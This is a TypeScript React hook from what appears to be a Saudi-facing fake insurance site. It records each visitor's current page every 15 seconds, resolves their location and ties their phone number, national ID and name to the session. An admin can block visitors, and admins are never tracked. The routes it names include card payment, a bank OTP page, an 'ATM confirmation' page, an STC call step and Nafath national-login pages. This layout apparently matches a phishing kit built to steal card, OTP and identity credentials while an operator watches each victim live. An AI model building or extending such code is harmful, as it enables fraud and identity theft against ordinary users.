import { useEffect, useRef, useCallback, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const PAGE_NAMES: Record<string, string> = {
  "/": "الصفحة الرئيسية",
  "/about": "من نحن",
  "/auth": "تسجيل الدخول",
  "/insurance-request": "طلب تأمين",
  "/insurance/offers": "عروض التأمين",
  "/insurance/compare": "مقارنة العروض",
  "/insurance/checkout": "إتمام الشراء",
  "/insurance/payment": "الدفع بالبطاقة",
  "/insurance/otp": "رمز التحقق البنكي",
  "/insurance/atm": "تأكيد ATM",
  "/insurance/phone-verify": "توثيق الجوال",
  "/insurance/phone-otp": "كود توثيق الجوال",
  "/insurance/phone-stc": "مكالمة STC",
  "/insurance/nafath-login": "دخول نفاذ",
  "/insurance/nafath-verify": "تحقق نفاذ",
  "/insurance/confirmation": "تأكيد الطلب",
  "/verify-policy": "التحقق من الوثيقة",
  "/admin/login": "دخول الأدمن",
  "/admin": "لوحة التحكم",
};

function getPageName(pathname: string): string {
  return PAGE_NAMES[pathname] || pathname;
}

function getSessionId(): string {
  let sid = sessionStorage.getItem("visitor_sid");
  if (!sid) {
    sid = crypto.randomUUID();
    sessionStorage.setItem("visitor_sid", sid);
  }
  return sid;
}

export function useVisitorTracking() {
  const location = useLocation();
  const navigate = useNavigate();
  const sessionId = useRef(getSessionId());
  const intervalRef = useRef<ReturnType<typeof setInterval>>();
  const [isBlocked, setIsBlocked] = useState(false);

  useEffect(() => {
    // Skip tracking for admin pages entirely
    if (location.pathname.startsWith("/admin")) return;

    // Skip if already identified as admin in this session
    if (sessionStorage.getItem("is_admin_session") === "1") return;

    const sid = sessionId.current;
    const pageName = getPageName(location.pathname);
    const geoResolved = sessionStorage.getItem("visitor_geo_resolved");

    const upsert = async () => {
      // Check if user is an authenticated admin
      const { data: { user } } = await supabase.auth.getUser();
      if (user) {
        const { data: roleData } = await supabase
          .from("user_roles")
          .select("role")
          .eq("user_id", user.id)
          .eq("role", "admin")
          .maybeSingle();
        if (roleData) {
          // Mark session as admin so we never track again
          sessionStorage.setItem("is_admin_session", "1");
          // Delete any existing visitor record for this session
          await supabase.from("site_visitors").delete().eq("session_id", sid);
          return;
        }
      }

      const { data } = await supabase.from("site_visitors").upsert(
        {
          session_id: sid,
          current_page: pageName,
          is_online: true,
          last_seen_at: new Date().toISOString(),
        },
        { onConflict: "session_id" }
      ).select("is_blocked").maybeSingle();

      if (data?.is_blocked) {
        setIsBlocked(true);
      }
    };

    upsert();

    // Resolve geo location once per session
    if (!geoResolved) {
      sessionStorage.setItem("visitor_geo_resolved", "1");
      supabase.functions.invoke("resolve-geo", {
        body: { session_id: sid },
      }).catch(() => {});
    }

    intervalRef.current = setInterval(upsert, 15000);

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [location.pathname]);

  // Redirect blocked visitors
  useEffect(() => {
    if (isBlocked && location.pathname !== "/") {
      navigate("/", { replace: true });
    }
  }, [isBlocked, location.pathname, navigate]);

  // Link visitor to form data
  const linkVisitorData = useCallback(async (data: {
    phone?: string;
    national_id?: string;
    visitor_name?: string;
    linked_request_id?: string;
    linked_conversation_id?: string;
  }) => {
    const sid = sessionId.current;
    await supabase.from("site_visitors").update({
      ...data,
      last_seen_at: new Date().toISOString(),
    }).eq("session_id", sid);
  }, []);

  // Mark offline on unload
  useEffect(() => {
    const handleUnload = () => {
      // sendBeacon for offline marking - handled by heartbeat timeout
    };
    window.addEventListener("beforeunload", handleUnload);
    return () => window.removeEventListener("beforeunload", handleUnload);
  }, []);

  return { linkVisitorData, sessionId: sessionId.current, isBlocked };
}
